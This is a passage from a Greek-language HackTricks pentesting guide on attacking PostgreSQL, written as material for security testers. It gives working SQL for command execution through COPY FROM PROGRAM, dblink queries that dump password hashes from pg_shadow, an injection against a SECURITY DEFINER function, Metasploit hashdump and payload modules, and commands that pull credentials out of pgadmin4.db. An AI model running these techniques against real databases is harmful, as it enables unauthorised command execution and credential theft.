/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Στη συνέχεια, ο πίνακας `shell_commands_results` θα περιέχει την έξοδο του εκτελούμενου κώδικα:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Τοπική Σύνδεση

Ορισμένες κακοδιαμορφωμένες περιπτώσεις του postgresql μπορεί να επιτρέπουν τη σύνδεση οποιουδήποτε τοπικού χρήστη. Είναι δυνατόν να γίνει τοπική σύνδεση από τη διεύθυνση 127.0.0.1 χρησιμοποιώντας τη **συνάρτηση `dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Σημείωση ότι για το προηγούμενο ερώτημα να λειτουργήσει **η συνάρτηση `dblink` πρέπει να υπάρχει**. Αν δεν υπάρχει, μπορείτε να προσπαθήσετε να τη δημιουργήσετε με την εντολή
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Εάν έχετε τον κωδικό πρόσβασης ενός χρήστη με περισσότερα προνόμια, αλλά ο χρήστης δεν επιτρέπεται να συνδεθεί από εξωτερική διεύθυνση IP, μπορείτε να χρησιμοποιήσετε την παρακάτω συνάρτηση για να εκτελέσετε ερωτήματα ως αυτός ο χρήστης:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Είναι δυνατόν να ελέγξετε αν αυτή η συνάρτηση υπάρχει με:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Προσαρμοσμένη συνάρτηση με** SECURITY DEFINER

[**Σε αυτήν την ανάλυση**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), οι pentesters κατάφεραν να προωθηθούν εντός ενός παραδείγματος postgres που παρέχεται από την IBM, επειδή **βρήκαν αυτήν τη συνάρτηση με τη σημαία SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Όπως [**εξηγείται στα έγγραφα**](https://www.postgresql.org/docs/current/sql-createfunction.html), μια συνάρτηση με τον **SECURITY DEFINER εκτελείται** με τα δικαιώματα του **χρήστη που την κατέχει**. Επομένως, αν η συνάρτηση είναι **ευάλωτη σε SQL Injection** ή κάνει κάποιες **προνομιούχες ενέργειες με παραμέτρους που ελέγχονται από τον επιτιθέμενο**, μπορεί να καταχραστεί για να **αναβαθμίσει τα προνόμια μέσα στο postgres**.

Στη γραμμή 4 του προηγούμενου κώδικα μπορείτε να δείτε ότι η συνάρτηση έχει τη σημαία **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Και στη συνέχεια **εκτελέστε εντολές**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Περάστε το Burteforce με το PL/pgSQL

Το **PL/pgSQL** είναι μια **πλήρως λειτουργική γλώσσα προγραμματισμού** που προσφέρει μεγαλύτερο διαδικαστικό έλεγχο σε σύγκριση με την SQL. Επιτρέπει τη χρήση **βρόχων** και άλλων **δομών ελέγχου** για τη βελτίωση της λογικής του προγράμματος. Επιπλέον, οι **δηλώσεις SQL** και οι **ενεργοποιητές** έχουν τη δυνατότητα να καλούν συναρτήσεις που δημιουργούνται χρησιμοποιώντας τη γλώσσα **PL/pgSQL**. Αυτή η ολοκλήρωση επιτρέπει μια πιο ολοκληρωμένη και ευέλικτη προσέγγιση στον προγραμματισμό και την αυτοματοποίηση της βάσης δεδομένων.\
**Μπορείτε να καταχραστείτε αυτήν τη γλώσσα για να ζητήσετε από το PostgreSQL να δοκιμάσει με βία τα διαπιστευτήρια των χρηστών.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### καταγραφή

Μέσα στο αρχείο _**postgresql.conf**_ μπορείτε να ενεργοποιήσετε τα logs του postgresql αλλάζοντας:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Στη συνέχεια, **επανεκκινήστε την υπηρεσία**.

### pgadmin

Το [pgadmin](https://www.pgadmin.org) είναι μια πλατφόρμα διαχείρισης και ανάπτυξης για το PostgreSQL.\
Μπορείτε να βρείτε **κωδικούς πρόσβασης** μέσα στο αρχείο _**pgadmin4.db**_.\
Μπορείτε να τους αποκρυπτογραφήσετε χρησιμοποιώντας τη συνάρτηση _**decrypt**_ μέσα στο σενάριο: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Η πιστοποίηση του πελάτη στο PostgreSQL διαχειρίζεται μέσω ενός αρχείου ρυθμίσεων που ονομάζεται **pg_hba.conf**. Αυτό το αρχείο περιέχει μια σειρά εγγραφών, καθεμία από τις οποίες καθορίζει τον τύπο σύνδεσης, την περιοχή διευθύνσεων IP του πελάτη (εάν εφαρμόζεται), το όνομα της βάσης δεδομένων, το όνομα του χρήστη και τη μέθοδο πιστοποίησης που θα χρησιμοποιηθεί για τις αντίστοιχες συνδέσεις. Η πρώτη εγγραφή που ταιριάζει με τον τύπο σύνδεσης, τη διεύθυνση IP του πελάτη, την αιτούμενη βάση δεδομένων και το όνομα χρήστη χρησιμοποιείται για την πιστοποίηση. Δεν υπάρχει εναλλακτική λύση ή αντιγραφή ασφαλείας εάν η πιστοποίηση αποτύχει. Εάν δεν υπάρχει ταιριαστή εγγραφή, η πρόσβαση απορρίπτεται.

Οι διαθέσιμες μέθοδοι πιστοποίησης βασισμένες σε κωδικό στο αρχείο pg_hba.conf είναι οι **md5**, **crypt** και **password**. Αυτές οι μέθοδοι διαφέρουν στον τρόπο μετάδοσης του κωδικού πρόσβασης: κατακερματισμένο με MD5, κρυπτογραφημένο με crypt ή καθαρό κείμενο. Σημειώνεται ότι η μέθοδος crypt δεν μπορεί να χρησιμοποιηθεί με κωδικούς πρόσβασης που έχουν κρυπτογραφηθεί στο pg_authid.

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
